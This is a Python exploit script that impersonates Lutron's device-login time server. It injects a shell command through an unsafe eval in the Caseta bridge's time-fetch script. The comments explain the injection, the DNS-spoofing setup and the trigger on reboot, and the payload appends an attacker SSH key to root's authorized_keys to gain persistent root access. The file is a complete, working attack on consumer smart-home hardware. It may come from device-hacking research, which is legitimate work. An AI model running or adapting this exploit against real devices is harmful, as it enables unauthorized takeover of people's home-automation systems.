#!/usr/bin/env python3
"""
Fake device-login.lutron.com time server for Caseta eval injection exploit.

The Caseta bridge fetches time from http://device-login.lutron.com/api/v1/devices/utctime
as a backup time source. The response goes through an unsafe eval in getTimeFromURL.sh:

    eval ${returnDateTime}=${responseData}

No TLS verification (plain HTTP). No input validation on the response body.

Setup:
1. Add DNS override: device-login.lutron.com -> <your IP>
2. Run this server: python3 tools/fake-time-server.py
3. Power cycle the Caseta bridge (or wait for time check — runs on boot + every 2min)

The exploit payload is embedded in the HTTP response body.
"""
import http.server
import os
import sys

PORT = 80
SSH_PUBKEY = open(os.path.expanduser("~/.ssh/id_ed25519_lutron.pub")).read().strip()

# The response body goes into: eval ${returnDateTime}=RESPONSE_BODY
# So we need:  $(command)  which eval will execute
# The parseCurlOuput splits on "_httpcode" first, so our payload is everything before that marker.
# curl adds "_httpcode=200" at the end via -w flag.
# So the full curl output is: <response_body>_httpcode=200
# parseCurlOuput does: responseData = everything before "_httpcode"
# Then: eval ${returnDateTime}=${responseData}
#
# If responseData = $(mkdir -p /root/.ssh && echo 'KEY' >> /root/.ssh/authorized_keys && echo 0)
# The eval becomes: eval returnDateTime=$(mkdir -p /root/.ssh && echo ... && echo 0)
# Which executes the command substitution and sets returnDateTime to "0"

PAYLOAD = f"$(mkdir -p /root/.ssh && echo '{SSH_PUBKEY}' >> /root/.ssh/authorized_keys && echo 0)"

class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode() if length else ""

        print(f"\n[+] POST {self.path}")
        print(f"    From: {self.client_address[0]}")
        print(f"    Body: {body[:200]}")

        if "/utctime" in self.path or "/devices" in self.path:
            print(f"[!] SENDING EXPLOIT PAYLOAD")
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(PAYLOAD.encode())
            print(f"[!] Payload sent: {PAYLOAD[:80]}...")
        else:
            print(f"[-] Unknown path, sending 404")
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        print(f"\n[+] GET {self.path} from {self.client_address[0]}")
        self.send_response(404)
        self.end_headers()

    def log_message(self, format, *args):
        pass  # suppress default logging

if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else PORT
    print(f"=== Caseta Time Server Exploit ===")
    print(f"Listening on port {port}")
    print(f"DNS: point device-login.lutron.com -> this machine")
    print(f"SSH key: {SSH_PUBKEY[:50]}...")
    print(f"Payload: {PAYLOAD[:80]}...")
    print(f"Waiting for bridge to connect...\n")

    server = http.server.HTTPServer(("0.0.0.0", port), Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nStopped.")
